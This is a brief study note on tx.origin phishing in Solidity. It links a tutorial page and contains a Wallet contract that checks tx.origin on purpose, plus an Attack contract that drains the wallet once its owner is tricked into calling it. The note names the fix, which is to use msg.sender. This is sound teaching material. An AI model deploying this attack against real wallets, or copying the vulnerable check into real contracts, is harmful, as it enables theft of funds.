#phishing
https://solidity-by-example.org/hacks/phishing-with-tx-origin/

If the `owner` was tricked signing `Attack.attack()`, since `tx.origin`is owner, `Wallet.transfer()` will run successfully 

Solution: use `msg.sender` instead of `tx.origin`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}

```
